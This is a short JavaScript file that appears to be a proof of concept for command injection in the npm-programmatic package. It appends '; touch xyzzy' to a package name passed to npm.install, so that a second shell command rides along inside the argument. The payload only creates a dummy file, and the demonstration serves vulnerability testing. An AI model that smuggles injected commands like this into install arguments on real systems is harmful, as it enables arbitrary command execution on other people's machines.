done = function done(){
    console.log("Done!");
};


var DUMMY_FILE = './xyzzy';

var command = "$(touch " + DUMMY_FILE + ")";

function dummySource(val){
    command += val;
}

dummySource(' ');

var npm = require('npm-programmatic');

var command = '; touch xyzzy';

npm.install(['left-pad'+command], {
        cwd:'.',
        save:true
    })
    .then(function(){
        console.log("SUCCESS!!!");
    })
    .catch(function(){
        console.log("Unable to install package");
    });

done();


